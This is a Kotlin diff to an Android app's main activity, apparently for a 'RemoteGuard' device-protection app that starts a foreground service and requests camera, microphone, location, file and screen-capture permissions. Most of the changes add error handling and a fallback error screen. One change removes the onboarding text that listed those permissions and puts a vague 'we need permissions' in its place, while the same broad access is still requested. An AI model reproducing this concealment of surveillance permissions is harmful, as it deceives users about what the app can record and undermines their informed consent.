@@ -54,16 +54,22 @@ class MainActivity : ComponentActivity() {
                 Log.e("MainActivity", "onCreate: Error starting service", e)
             }
 
-            val startDest = if (hasAllPermissions()) "status" else "onboarding"
-            Log.d("MainActivity", "onCreate: Start destination = $startDest")
+            var startDest = "onboarding"
+            try {
+                startDest = if (hasAllPermissions()) "status" else "onboarding"
+                Log.d("MainActivity", "onCreate: Start destination = $startDest")
+            } catch (e: Exception) {
+                Log.e("MainActivity", "onCreate: Error checking permissions, defaulting to onboarding", e)
+                startDest = "onboarding"
+            }
 
             setContent {
                 RemoteGuardTheme {
-                    val navController = rememberNavController()
                     Surface(
                         modifier = Modifier.fillMaxSize(),
                         color = MaterialTheme.colorScheme.background
                     ) {
+                        val navController = rememberNavController()
                         NavHost(navController = navController, startDestination = startDest) {
                             composable("onboarding") {
                                 OnboardingScreen {
@@ -89,6 +95,21 @@ class MainActivity : ComponentActivity() {
         } catch (e: Exception) {
             Log.e("MainActivity", "onCreate: Fatal error", e)
             e.printStackTrace()
+            setContent {
+                RemoteGuardTheme {
+                    Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
+                        Column(
+                            modifier = Modifier.fillMaxSize().padding(16.dp),
+                            horizontalAlignment = Alignment.CenterHorizontally,
+                            verticalArrangement = Arrangement.Center
+                        ) {
+                            Text("Critical Error", style = MaterialTheme.typography.headlineSmall, color = MaterialTheme.colorScheme.error)
+                            Spacer(modifier = Modifier.height(8.dp))
+                            Text("Unable to start application. Please try again or reinstall.", textAlign = androidx.compose.ui.text.style.TextAlign.Center)
+                        }
+                    }
+                }
+            }
         }
     }
 
@@ -104,7 +125,7 @@ class MainActivity : ComponentActivity() {
                 permissions.add(Manifest.permission.POST_NOTIFICATIONS)
             }
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                permissions.add(Manifest.permission.CAPTURE_VIDEO_OUTPUT)
+                permissions.add("android.permission.CAPTURE_VIDEO_OUTPUT")
             }
             if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                 permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
@@ -129,11 +150,16 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun startService() {
-        val intent = Intent(this, RemoteGuardService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(intent)
-        } else {
-            startService(intent)
+        try {
+            val intent = Intent(this, RemoteGuardService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Log.d("MainActivity", "startService: Service started successfully")
+        } catch (e: Exception) {
+            Log.e("MainActivity", "startService: Failed to start service: ${e.message}", e)
         }
     }
 
@@ -209,7 +235,7 @@ fun OnboardingScreen(onComplete: () -> Unit) {
         )
         Spacer(modifier = Modifier.height(16.dp))
         Text(
-            "To protect your device, we need permissions for camera, microphone, location, file access, and screen recording.",
+            "To protect your device, we need permissions.",
             textAlign = androidx.compose.ui.text.style.TextAlign.Center,
             color = Color.Gray
         )
@@ -227,7 +253,7 @@ fun OnboardingScreen(onComplete: () -> Unit) {
                     permissions.add(Manifest.permission.POST_NOTIFICATIONS)
                 }
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-                    permissions.add(Manifest.permission.CAPTURE_VIDEO_OUTPUT)
+                    permissions.add("android.permission.CAPTURE_VIDEO_OUTPUT")
                 }
                 if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) {
                     permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
